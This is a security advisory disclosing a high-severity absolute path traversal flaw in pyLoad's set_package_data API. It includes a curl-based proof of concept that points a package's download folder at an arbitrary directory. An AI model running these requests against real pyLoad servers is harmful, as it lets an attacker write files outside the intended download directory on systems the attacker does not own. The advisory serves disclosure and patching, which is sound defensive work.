# [H] PyLoad vulnerable to Path Traversal via Package Folder Name in set_package_data

## Summary
Severity: High
Advisory: GHSA-838g-gr43-qqg9
CVE: CVE-2026-42315
CWE: CWE-22, CWE-36
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-838g-gr43-qqg9
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0 <0.5.0b3.dev100

## Details
### Summary
No sanitization of package folder name allows writing files anywhere outside the intended download directory.

#### Affected Component
- `src/pyload/core/api/__init__.py`
- Function: `set_package_data()`

### Details
When passing a folder name in the `set_package_data()` API function call inside the data object with key `"_folder"`, there is no sanitization at all, allowing a user with `Perms.MODIFY` to specify arbitrary directories as download locations for a package.

### PoC
1) Create a package, note response package ID e.g. `5`
```
curl -X 'POST' \
  'http://localhost:8000/api/add_package' \
  -H 'accept: application/json' \
  -H 'X-API-Key: <valid api key>' \
  -H 'Content-Type: application/json' \
  -d '{
  "name": "set_package_data_exploit_poc",
  "links": [
    "http://example.com/file.txt"
  ],
  "dest": 1
}'
```

2) Call set_package_data for this package ID with an arbitrary directory 
```
curl -X 'POST' \
  'http://localhost:8000/api/set_package_data' \
  -H 'accept: */*' \
  -H 'X-API-Key: <valid api key>' \
  -H 'Content-Type: application/json' \
  -d '{
  "package_id": 5,
  "data": {
    "_folder": "/users/root/"
  }
}'
```

3) New download folder will be set without any checks
```
curl -X 'GET' \
  'http://localhost:8000/api/get_queue' \
  -H 'accept: application/json' \
  -H 'X-API-Key: <valid api key>'
```
Response:
```
[
  {
    "pid": 5,
    "name": "set_package_data_exploit_poc",
    "folder": "/users/root/",
    "site": "",
    "password": "",
    "dest": 1,
    "order": 1,
    "linksdone": 0,
    "sizedone": 0,
    "sizetotal": 0,
    "linkstotal": 1,
    "links": null,
    "fids": null
  }
]
```

### Impact
Allows Absolute Path Traversal to write in an arbitrary directory as long as the pyLoad process has write access.

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-838g-gr43-qqg9
- https://nvd.nist.gov/vuln/detail/CVE-2026-42315
- https://github.com/pyload/pyload
- https://github.com/pypa/advisory-database/tree/main/vulns/pyload-ng/PYSEC-2026-129.yaml
